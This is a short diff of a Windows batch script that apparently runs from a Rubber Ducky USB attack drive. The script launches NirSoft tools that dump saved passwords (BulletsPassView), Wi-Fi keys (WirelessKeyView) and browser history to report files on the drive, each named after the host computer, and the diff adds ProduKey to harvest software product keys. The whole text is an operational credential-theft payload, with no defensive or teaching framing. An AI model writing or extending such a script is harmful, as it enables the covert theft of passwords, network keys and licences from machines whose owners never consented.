@@ -12,4 +12,5 @@ start %DUCKYdrive%\ChromeHistoryView.exe /stext %DUCKYdrive%\Reports\ChromeHisto
 start %DUCKYdrive%\BulletsPassView.exe /stext %DUCKYdrive%\Reports\BulletsPassView-%computername%.txt
 start %DUCKYdrive%\BrowsingHistoryView.exe /stext %DUCKYdrive%\Reports\BrowsingHistoryView-%computername%.txt
 start %DUCKYdrive%\WirelessKeyView.exe /stext %DUCKYdrive%\Reports\WirelessKeyView-%computername%.txt
+start %DUCKYdrive%\ProduKey.exe /stext %DUCKYdrive%\Reports\ProduKey-%computername%.txt
 exit
